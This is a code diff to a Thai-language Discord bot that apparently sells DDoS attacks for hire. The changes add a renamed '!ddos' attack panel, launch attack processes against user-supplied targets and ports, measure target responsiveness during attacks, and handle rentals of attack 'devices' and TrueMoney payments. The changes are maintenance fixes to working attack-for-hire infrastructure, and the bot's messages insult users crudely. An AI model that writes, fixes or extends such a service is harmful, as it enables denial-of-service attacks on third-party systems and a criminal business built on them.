@@ -4,6 +4,7 @@ import ipaddress
 import os
 import re
 import time
+import traceback
 from urllib.parse import urlparse
 
 import aiohttp
@@ -20,6 +21,7 @@ from ui_components import (
     build_attack_running_embed, ModuleView,
     ShopView, build_shop_embed, DeviceTypeView, PeriodView, QuantityView,
     RENT_PRICES, BUY_PRICES, RENT_SECONDS,
+    ASSET_ATTACK_BANNER, ASSET_ATTACK_RUNNING, ASSET_SHOP_BANNER,
 )
 
 intents = discord.Intents.default()
@@ -33,6 +35,18 @@ proxy_mgr = ProxyManager()
 tm = TrueMoneyClient()
 
 active_attacks: dict[int, dict] = {}
+
+# ── H4: global aiohttp session ──
+_http: aiohttp.ClientSession | None = None
+
+
+async def http() -> aiohttp.ClientSession:
+    global _http
+    if _http is None or _http.closed:
+        _http = aiohttp.ClientSession(
+            timeout=aiohttp.ClientTimeout(total=5)
+        )
+    return _http
 
 
 # ============================================================
@@ -55,12 +69,18 @@ def is_forbidden(target: str) -> bool:
 
     try:
         ip = ipaddress.ip_address(host)
-        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
+        if (ip.is_private or ip.is_loopback
+                or ip.is_link_local or ip.is_reserved):
             return True
     except ValueError:
         pass
 
     return host in FORBIDDEN_IPS
+
+
+def _asset(name: str) -> discord.File:
+    """สร้าง discord.File จาก path asset"""
+    return discord.File(name, filename=os.path.basename(name))
 
 
 # ============================================================
@@ -70,7 +90,9 @@ def is_forbidden(target: str) -> bool:
 async def rental_watchdog():
     try:
         expired = await db.pop_expired_rentals()
-    except Exception:
+    except Exception as e:
+        print(f"[watchdog] {e}")
+        traceback.print_exc()
         return
     for r in expired:
         user = bot.get_user(r["user_id"])
@@ -83,11 +105,20 @@ async def rental_watchdog():
                 pass
 
 
+# ============================================================
+# Events
+# ============================================================
 @bot.event
 async def on_ready():
-    os.makedirs("data", exist_ok=True)
+    os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
     await db.init()
     print(f"[VANTA] logged in as {bot.user}")
+
+    global _http
+    if _http is None or _http.closed:
+        _http = aiohttp.ClientSession(
+            timeout=aiohttp.ClientTimeout(total=5)
+        )
 
     asyncio.create_task(proxy_mgr.auto_refresh_loop())
 
@@ -98,23 +129,51 @@ async def on_ready():
         rental_watchdog.start()
 
 
+# ── M2: error handler ──
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.MemberNotFound):
+        await ctx.send("หา member ไม่เจอ")
+    elif isinstance(error, commands.MissingRequiredArgument):
+        await ctx.send(f"ใช้: `!{ctx.command.name} {error.param.name}`")
+    elif isinstance(error, commands.CommandNotFound):
+        pass
+    else:
+        print(f"[cmd error] {error}")
+        traceback.print_exception(type(error), error, error.__traceback__)
+
+
 # ============================================================
 # Setup commands
 # ============================================================
-@bot.command()
-async def setup(ctx):
+# ── C3: !ddos เป็นชื่อหลัก + alias !setup ──
+@bot.command(name="ddos", aliases=["setup"])
+async def ddos_panel(ctx):
+    if not is_owner(ctx.author.id):
+        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย")
+        return
+    file = _asset(ASSET_ATTACK_BANNER) if os.path.exists(
+        ASSET_ATTACK_BANNER) else None
+    if file:
+        await ctx.send(embed=build_attack_embed(),
+                       view=AttackPanel(OWNER_ID), file=file)
+    else:
+        await ctx.send(embed=build_attack_embed(),
+                       view=AttackPanel(OWNER_ID))
+
+
+@bot.command(name="shop")
+async def shop_panel(ctx):
     if not is_owner(ctx.author.id):
         await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
         return
-    await ctx.send(embed=build_attack_embed(), view=AttackPanel(OWNER_ID))
-
-
-@bot.command()
-async def shop(ctx):
-    if not is_owner(ctx.author.id):
-        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-        return
-    await ctx.send(embed=build_shop_embed(), view=ShopView())
+    file = _asset(ASSET_SHOP_BANNER) if os.path.exists(
+        ASSET_SHOP_BANNER) else None
+    if file:
+        await ctx.send(embed=build_shop_embed(),
+                       view=ShopView(), file=file)
+    else:
+        await ctx.send(embed=build_shop_embed(), view=ShopView())
 
 
 # ============================================================
@@ -130,6 +189,12 @@ async def handle_attack_submit(interaction: discord.Interaction, modal):
         return
 
     user = await db.get_user(user_id)
+    if not user:   # ── H5 ──
+        await interaction.response.send_message(
+            "DB error — ลองอีกครั้ง", ephemeral=True
+        )
+        return
+
     if user["banned"]:
         await interaction.response.send_message(
             "มึงโดนแบนอยู่ ใช้บอทไม่ได้ — ติดต่อเจ้าของบอท", ephemeral=True
@@ -200,8 +265,14 @@ async def start_attack(interaction: discord.Interaction, module: str,
         target=f"{target}:{port}", time_left=duration,
         speed="measuring...", module=module,
     )
-    await interaction.followup.send(embed=embed)
-    msg = await interaction.original_response()
+
+    # ── C1: followup.send() คืน WebhookMessage ที่ edit ได้ ──
+    if os.path.exists(ASSET_ATTACK_RUNNING):
+        msg = await interaction.followup.send(
+            embed=embed, file=_asset(ASSET_ATTACK_RUNNING)
+        )
+    else:
+        msg = await interaction.followup.send(embed=embed)
 
     state = {
         "target": target, "port": port, "duration": duration,
@@ -213,12 +284,11 @@ async def start_attack(interaction: discord.Interaction, module: str,
 
 
 async def _attack_loop(user_id: int, state: dict):
-    msg: discord.Message = state["message"]
+    msg = state["message"]
     proc = state["proc"]
     target_full = f"{state['target']}:{state['port']}"
 
     while True:
-        # process ตายก่อนเวลา?
         if proc.returncode is not None:
             engine.running.pop(user_id, None)
             active_attacks.pop(user_id, None)
@@ -269,9 +339,9 @@ async def _measure_speed(target: str, port: int) -> str:
         url = f"{scheme}://{target}:{port}"
     try:
         start = time.time()
-        async with aiohttp.ClientSession() as s:
-            async with s.get(url, timeout=5) as r:
-                data = await r.read()
+        s = await http()   # ── H4 ──
+        async with s.get(url) as r:
+            data = await r.read()
         elapsed = max(0.001, time.time() - start)
         ms = int(elapsed * 1000)
         kbps = (len(data) / 1024) / elapsed
@@ -283,9 +353,9 @@ async def _measure_speed(target: str, port: int) -> str:
 # ============================================================
 # !device / !b / !ub
 # ============================================================
-@bot.command()
-async def device(ctx, member: discord.Member = None,
-                 amount: str = None, duration: str = "TH"):
+@bot.command(name="device")
+async def device_cmd(ctx, member: discord.Member = None,
+                     amount: str = None, duration: str = "TH"):
     if not is_owner(ctx.author.id):
         await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
         return
@@ -303,7 +373,21 @@ async def device(ctx, member: discord.Member = None,
         await ctx.send("จำนวนต้องมากกว่า 0")
         return
 
+    # ── H3: ลบ → ล้าง rental record ด้วย ──
     if sign < 0:
+        import aiosqlite
+        async with aiosqlite.connect(db.path) as c:
+            await c.execute(
+                "UPDATE device_rentals SET devices = MAX(0, devices - ?) "
+                "WHERE user_id = ?",
+                (num, member.id),
+            )
+            await c.execute(
+                "DELETE FROM device_rentals "
+                "WHERE user_id = ? AND devices <= 0",
+                (member.id,),
+            )
+            await c.commit()
         new = await db.add_devices(member.id, -num)
         await ctx.send(f"ลบ {num} device จาก {member.mention} — เหลือ {new}")
         return
@@ -315,13 +399,16 @@ async def device(ctx, member: discord.Member = None,
         )
         return
 
-    # คำนวณ seconds
-    if duration.endswith("h"):
-        secs = int(duration[:-1]) * 3600
-    elif duration.endswith("d"):
-        secs = int(duration[:-1]) * 86400
+    # ── M3: รองรับ m / h / d ──
+    dur_lower = duration.lower()
+    if dur_lower.endswith("m"):
+        secs = int(dur_lower[:-1]) * 60
+    elif dur_lower.endswith("h"):
+        secs = int(dur_lower[:-1]) * 3600
+    elif dur_lower.endswith("d"):
+        secs = int(dur_lower[:-1]) * 86400
     else:
-        await ctx.send("รูปแบบเวลา: 1h / 1d / TH")
+        await ctx.send("รูปแบบเวลา: 30m / 1h / 1d / TH")
         return
 
     expires_at = int(time.time()) + secs
@@ -331,8 +418,8 @@ async def device(ctx, member: discord.Member = None,
     )
 
 
-@bot.command()
-async def b(ctx, member: discord.Member):
+@bot.command(name="b")
+async def ban_cmd(ctx, member: discord.Member):
     if not is_owner(ctx.author.id):
         await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
         return
@@ -340,8 +427,8 @@ async def b(ctx, member: discord.Member):
     await ctx.send(f"แบน {member.mention} แล้ว")
 
 
-@bot.command()
-async def ub(ctx, member: discord.Member):
+@bot.command(name="ub")
+async def unban_cmd(ctx, member: discord.Member):
     if not is_owner(ctx.author.id):
         await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
         return
@@ -375,6 +462,11 @@ async def shop_quantity_selected(interaction: discord.Interaction, mode: str,
                                  period: str | None, qty: int):
     user_id = interaction.user.id
     user = await db.get_user(user_id)
+    if not user:
+        await interaction.response.edit_message(
+            content="DB error", view=None
+        )
+        return
 
     if mode == "rent":
         if period is None:
@@ -407,12 +499,10 @@ async def shop_quantity_selected(interaction: discord.Interaction, mode: str,
         )
         return
 
-    # ตัดเงิน
     await db.add_balance(user_id, -price, "purchase",
                          f"{mode} {qty} {period or ''}")
     new_dev = await db.add_devices(user_id, qty)
 
-    # ถ้าเช่า → add rental record
     if mode == "rent":
         secs = RENT_SECONDS.get(period, 0)
         if secs:
@@ -458,9 +548,10 @@ async def process_topup(interaction: discord.Interaction, link: str):
     amount = result["amount"]
     new_bal = await db.add_balance(user_id, amount, "topup", link)
     user = await db.get_user(user_id)
-    await db.update_user(
-        user_id, total_deposited=user["total_deposited"] + amount
-    )
+    if user:
+        await db.update_user(
+            user_id, total_deposited=user["total_deposited"] + amount
+        )
 
     await interaction.followup.send(
         f"เติม {amount:.0f}💵 สำเร็จ — เหลือ {new_bal:.0f}💵",
@@ -475,8 +566,8 @@ async def process_topup(interaction: discord.Interaction, link: str):
         )
 
 
-@bot.command()
-async def topup(ctx, link: str = None):
+@bot.command(name="topup")
+async def topup_cmd(ctx, link: str = None):
     if not link:
         await ctx.send("ใช้: `!topup <ลิงก์ซองทรูมันนี่>`")
         return
@@ -490,9 +581,10 @@ async def topup(ctx, link: str = None):
     amount = result["amount"]
     new_bal = await db.add_balance(user_id, amount, "topup", link)
     user = await db.get_user(user_id)
-    await db.update_user(
-        user_id, total_deposited=user["total_deposited"] + amount
-    )
+    if user:
+        await db.update_user(
+            user_id, total_deposited=user["total_deposited"] + amount
+        )
 
     await ctx.send(f"เติมเงินสำเร็จ {amount:.0f}💵 — เหลือ {new_bal:.0f}💵")
 
@@ -507,5 +599,10 @@ async def topup(ctx, link: str = None):
 # Run
 # ============================================================
 if __name__ == "__main__":
-    os.makedirs("data", exist_ok=True)
+    if not BOT_TOKEN or BOT_TOKEN.startswith("ใส่_"):   # ── H2 ──
+        raise SystemExit(
+            "❌ BOT_TOKEN ยังไม่ได้ตั้ง — export BOT_TOKEN='...' ก่อนรัน"
+        )
+    os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
+    os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
     bot.run(BOT_TOKEN)
